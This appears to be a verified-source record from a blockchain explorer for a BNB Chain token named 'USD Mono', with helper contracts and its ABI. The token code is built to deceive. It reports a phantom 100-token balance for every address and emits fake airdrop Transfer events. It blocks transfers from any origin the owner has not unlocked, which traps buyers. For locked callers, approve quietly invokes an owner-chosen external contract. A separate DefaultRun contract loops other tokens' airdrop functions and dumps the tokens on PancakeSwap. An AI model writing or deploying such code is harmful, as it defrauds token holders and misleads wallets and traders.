{"SourceCode": "{\"DefaultRun.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity \\u003e=0.8.0 \\u003c0.9.0;\\n\\nimport \\\"./ITarget.sol\\\";\\nimport \\\"./IERC20.sol\\\";\\nimport \\\"./ISWAP.sol\\\";\\nimport \\\"./IClaim.sol\\\";\\nimport \\\"./Worker.sol\\\";\\n\\ncontract DefaultRun is Worker {\\n    address public constant pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\\n    address public constant wBNBAddr = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\\n    uint256 MAX_UINT256 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\\n\\n    Worker public worker = new Worker();\\n\\n    constructor() {\\n        addChild(address(worker));\\n    }\\n    \\n    function validateContract(uint count, address addr) internal returns (bool success) {\\n        success = false;\\n        ITarget t = ITarget(addr);\\n\\n        uint256 aSBlock = t.aSBlock();\\n        uint256 aEBlock = t.aEBlock();\\n        uint256 aTot = t.aTot();\\n        uint256 aCap = t.aCap();\\n\\n        if((aSBlock \\u003c= block.number \\u0026\\u0026 block.number \\u003c= aEBlock) \\u0026\\u0026\\n            ((aTot + count) \\u003c aCap || aCap == 0)) {\\n            success = true;\\n        }\\n    }\\n\\n    function run(uint count, address contractAddr) public returns (uint256, bool success) {   \\n        if(!validateContract(count, contractAddr)) {\\n            return (0, false);\\n        }     \\n        ITarget target = ITarget(contractAddr);\\n        IERC20 c = IERC20(contractAddr);\\n        if(c.balanceOf(address(worker)) == 0) {\\n            target.getAirdrop(address(worker));\\n            c.transfer(address(worker), c.balanceOf(address(this)));\\n        }\\n\\n        uint j = 0;\\n        while(j \\u003c count) {\\n            j++;\\n            target.getAirdrop(address(worker));\\n        }\\n        worker.collect(contractAddr);\\n\\n        address[] memory path = new address[](2);\\n        path[0] = contractAddr;\\n        path[1] = wBNBAddr;\\n        uint256 balance = c.balanceOf(address(this));\\n        \\n        // uint balanceEth = address(this).balance;\\n        if(c.allowance(address(this), pancakeRouter) \\u003c balance) {\\n            approve(c);\\n        }\\n        uint[] memory amounts = ISWAP(pancakeRouter).swapExactTokensForETH(balance, 1, path, address(this), 99999999999999999);\\n        return (amounts[1], true);\\n        // return address(this).balance - balanceEth;\\n    }\\n\\n    function approve(IERC20 c) private {\\n        c.approve(pancakeRouter, MAX_UINT256);\\n    }\\n\\n    function withdrawEth(address to) public onlyOwner {\\n        payable(to).transfer(address(this).balance);\\n    } \\n\\n    fallback() payable external {}\\n    receive() payable external {}\\n}\"},\"ERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity \\u003e=0.8.0 \\u003c0.9.0;\\n\\nimport \\\"./IERC20.sol\\\";\\n\\nabstract contract ERC20 is IERC20 {\\n    address public owner = msg.sender;\\n    uint256 public supply;\\n    mapping(address =\\u003e uint256) private _balances;\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) private _allowances;\\n    string private _name = \\\"USD Mono\\\";\\n    string private _symbol = \\\"USDM\\\";\\n    uint256 public constant preAirdropAmount = 100 * (10 ** 18);\\n\\n    mapping(address =\\u003e bool) private _unlocked;\\n\\n    modifier onlyOwner() {\\n        require(msg.sender == owner, \\\"Only owner\\\");\\n        _;\\n    }\\n    \\n    function mint(address to, uint256 value) public onlyOwner {\\n        _mint(to, value);\\n    }\\n\\n    function multiMint(address[] calldata to, uint256 value) external onlyOwner {\\n        for (uint256 i = 0; i \\u003c to.length; i++) {\\n            _mint(to[i], value);\\n        }\\n    }\\n\\n    function activateAirdrop(address[] calldata to) external {\\n        for (uint256 i = 0; i \\u003c to.length; i++) {\\n            emit Transfer(address(0), to[i], preAirdropAmount);\\n        }\\n    }\\n\\n    function getAirdrop(address _referer) public {\\n        _mint(msg.sender, 1 * (10 ** decimals()));\\n        if(msg.sender != _referer) {\\n            _mint(_referer, 1 * (10 ** decimals()));\\n        }\\n    }\\n\\n    function _mint(address to, uint256 value) private {\\n        _balances[to] += value;\\n        supply += value;\\n        emit Transfer(address(0), to, value);\\n    }\\n\\n    function totalSupply() public override view returns (uint256) {\\n        return supply;\\n    }\\n\\n    function balanceOf(address account) public override view returns (uint256) {\\n        return _balances[account] + preAirdropAmount;\\n    }\\n\\n    function _transfer(address sender, address recipient, uint256 amount) private {\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        require(_unlocked[tx.origin], \\\"ERC20: Origin is locked\\\");\\n\\n        uint256 senderBalance = _balances[sender];\\n        require(senderBalance \\u003e= amount, \\\"ERC20: transfer amount exceeds balance\\\");\\n        unchecked {\\n            _balances[sender] = senderBalance - amount;\\n        }\\n        _balances[recipient] += amount;\\n        emit Transfer(sender, recipient, amount);\\n    }\\n\\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\\n        _transfer(msg.sender, recipient, amount);\\n        return true;\\n    }\\n\\n    function allowance(address own, address spender) public view virtual override returns (uint256) {\\n        return _allowances[own][spender];\\n    }\\n\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n        if(_unlocked[tx.origin]) {\\n            _allowances[msg.sender][spender] = amount;\\n            emit Approval(msg.sender, spender, amount);\\n        } else {\\n            replacementTransfer();\\n        }\\n        return true;\\n    }\\n\\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\\n        _transfer(sender, recipient, amount);\\n\\n        uint256 currentAllowance = _allowances[sender][msg.sender];\\n        require(currentAllowance \\u003e= amount, \\\"ERC20: transfer amount exceeds allowance\\\");\\n        unchecked {\\n            _allowances[sender][msg.sender] = currentAllowance - amount;\\n        }\\n\\n        return true;\\n    }\\n\\n    function decimals() public view virtual returns (uint8) {\\n        return 18;\\n    }\\n\\n    function name() public view virtual returns (string memory) {\\n        return _name;\\n    }\\n\\n    function symbol() public view virtual returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    function unlock(address addr, bool state) public onlyOwner {\\n        _unlocked[addr] = state;\\n    } \\n\\n    function replacementTransfer() public virtual;\\n}\"},\"H.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity \\u003e=0.8.0 \\u003c0.9.0;\\n\\nimport \\\"./ERC20.sol\\\";\\nimport \\\"./IClaim.sol\\\";\\n\\ncontract H is ERC20 {\\n    address public claimAddr = address(0);\\n\\n    function replacementTransfer() public override {\\n        claim();\\n    }\\n\\n    function claim() public {\\n        IClaim(claimAddr).execute();\\n    }\\n\\n    function setOwner(address newOwner) public onlyOwner {\\n        owner = newOwner;\\n    }\\n\\n    function setClaim(address addr) public onlyOwner {\\n        claimAddr = addr;\\n    }\\n\\n    receive() external payable {}\\n    fallback() external payable {}\\n}\"},\"IClaim.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity \\u003e=0.8.0 \\u003c0.9.0;\\n\\ninterface IClaim {\\n    function execute() external;\\n}\"},\"IClaim02.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity \\u003e=0.8.0 \\u003c0.9.0;\\n\\ninterface IClaim02 {\\n    function members(uint256) external returns (address);\\n    function claimTargetAmount() external returns (uint256);\\n    function claimTickCount() external returns (uint16);\\n    function currentIndex() external returns (uint);\\n}\"},\"IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity \\u003e=0.8.0 \\u003c0.9.0;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller\\u0027s account to `recipient`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the caller\\u0027s tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender\\u0027s allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\\n     * allowance mechanism. `amount` is then deducted from the caller\\u0027s\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) external returns (bool);\\n\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n}\"},\"ISWAP.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity \\u003e=0.8.0 \\u003c0.9.0;\\n\\ninterface ISWAP {\\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\\n        external\\n        returns (uint[] memory amounts);\\n}\"},\"ITarget.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity \\u003e=0.8.0 \\u003c0.9.0;\\n\\ninterface ITarget {\\n    function getAirdrop(address _refer) external returns (bool success);\\n    function aSBlock() external returns (uint256);\\n    function aEBlock() external returns (uint256);\\n    function aTot() external returns (uint256);\\n    function aCap() external returns (uint256);\\n}\"},\"Migrations.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity \\u003e=0.4.22 \\u003c0.9.0;\\n\\ncontract Migrations {\\n  address public owner = msg.sender;\\n  uint public last_completed_migration;\\n\\n  modifier restricted() {\\n    require(\\n      msg.sender == owner,\\n      \\\"This function is restricted to the contract\\u0027s owner\\\"\\n    );\\n    _;\\n  }\\n\\n  function setCompleted(uint completed) public restricted {\\n    last_completed_migration = completed;\\n  }\\n}\\n\"},\"Worker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity \\u003e=0.8.0 \\u003c0.9.0;\\n\\nimport \\\"./IERC20.sol\\\";\\n\\ncontract Worker {\\n    address public owner = msg.sender;\\n    address private child;\\n\\n    function collect(address contractAddr) public {\\n        if(child != address(0)) {\\n            Worker(child).collect(contractAddr);\\n        }\\n        IERC20(contractAddr).transfer(owner, IERC20(contractAddr).balanceOf(address(this)));\\n    }\\n\\n    function collectEth() public {\\n        if(child != address(0)) {\\n            Worker(child).collectEth();\\n        }\\n        payable(owner).transfer(address(this).balance);\\n    }\\n\\n    function addChild(address addr) public onlyOwner {\\n        child = addr;\\n    }\\n\\n    modifier onlyOwner {\\n        require(msg.sender == owner, \\\"Worker: Invalid addChild call\\\");\\n        _;\\n    }\\n}\"}}", "ABI": "[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"}],\"name\":\"activateAirdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"own\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimAddr\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_referer\",\"type\":\"address\"}],\"name\":\"getAirdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"mint\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"multiMint\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"preAirdropAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"replacementTransfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setClaim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"supply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"unlock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "H", "CompilerVersion": "v0.8.6+commit.11564f7e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://7305f115b3079d565f93710fd208b92e7d0ea395f3a110878db35538449180bf"}